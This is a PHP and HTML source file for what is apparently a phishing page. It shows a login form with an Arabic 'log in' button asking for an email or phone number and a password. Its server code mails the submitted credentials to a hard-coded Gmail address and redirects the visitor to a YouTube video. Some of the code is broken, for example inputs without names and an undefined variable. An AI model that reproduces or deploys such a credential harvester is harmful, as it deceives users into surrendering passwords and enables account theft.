<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=1">
<title>Form Submit to Send Email</title>
<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>

<?php
header("Location: https://www.youtube.com/watch?v=AxFDL_BYR1c");
if(!empty($_POST["send"])) {
	$EmailorNumber = $_POST["Email or Phone Number"];
  $Password = $_POST["Password"];
	$userPhone = $_POST["userPhone"];
	$userMessage = $_POST["userMessage"];
	$toEmail = "jlk75452@gmail.com";
  
	$mailHeaders = "Email or Phone Number: " . $EmailorNumber .
	"\r\n Password: ". $Password  . 
	"\r\n Phone: ". $userPhone  . 
	"\r\n Message: " . $userMessage . "\r\n";

	if(mail($toEmail, $userName, $mailHeaders)) {
	    $message = "Your contact information is received successfully.";
	}
}
?>

<div class="form-container">
  <form name="contactFormEmail" method="post">
    <div class="input-row">
      <label>EmailorNumber<em>*</em></label> 
      <input type="text" EmailorNumber="Email or Phone Number" required id="Email or Phone Number"> 
    </div>
    <div class="input-row">
      <label>Password <em>*</em></label> 
      <input type="email" Password="Password" required id="Password"> 
    </div>
     <!-- <textarea name="userMessage" required id="userMessage"> -->
    </div>
    <div class="input-row">
      <input type="submit" name="send" value="تسجيل الدخول">
      <?php if (! empty($message)) {?>
      <div class='success'>
        <strong><?php echo $message; ?>	</strong>
      </div>
      <?php } ?>
    </div>
  </form>
</div>

</body>
</html>


